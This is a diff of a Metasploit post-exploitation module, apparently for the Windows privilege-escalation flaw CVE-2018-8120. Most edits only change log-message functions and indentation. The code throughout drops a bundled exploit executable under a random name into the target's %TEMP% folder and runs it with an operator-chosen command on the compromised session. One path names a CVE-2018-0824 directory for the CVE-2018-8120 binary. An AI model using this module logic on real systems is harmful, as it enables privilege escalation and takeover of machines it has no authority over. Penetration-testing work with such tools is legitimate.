@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Post
 
    def write_exe_to_target(rexe, rexename)
      begin
-       print_warning("Writing file to temp")
+       print_status("Writing file to temp")
        temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      end
@@ -68,24 +68,24 @@ class MetasploitModule < Msf::Post
    end
 
    def run
-      rexename =  Rex::Text.rand_text_alphanumeric(10) + ".exe"
-      print_status("EXE name is: #{rexename}")
-      poccmd =  datastore['POCCMD']
+    rexename =  Rex::Text.rand_text_alphanumeric(10) + ".exe"
+     print_good("EXE name is: #{rexename}")
+     poccmd =  datastore['POCCMD']
 
-      rexe = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'CVE-2018-8120.exe')
-      raw = create_payload_from_file rexe
-      script_on_target = write_exe_to_target(raw, rexename)
+    rexe = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'CVE-2018-8120.exe')
+     raw = create_payload_from_file rexe
+     script_on_target = write_exe_to_target(raw, rexename)
 
-      print_status('Initiating module...')
-      print_line
+     print_good('Initiating module...')
+     print_line
 
-      command = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
-      print_status("Location of CVE-2018-8120.exe is: #{command}")
-      command += " "
-      command += "#{poccmd}"
-      print_status("Executing command : #{command}")
-      command_output = cmd_exec(command)
-      print_line(command_output)
-      print_line
+     command = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
+     print_good("Location of CVE-2018-8120.exe is: #{command}")
+     command += " "
+     command += "#{poccmd}"
+     print_good("Executing command : #{command}")
+     command_output = cmd_exec(command)
+     print_line(command_output)
+    print_line
   end
 end
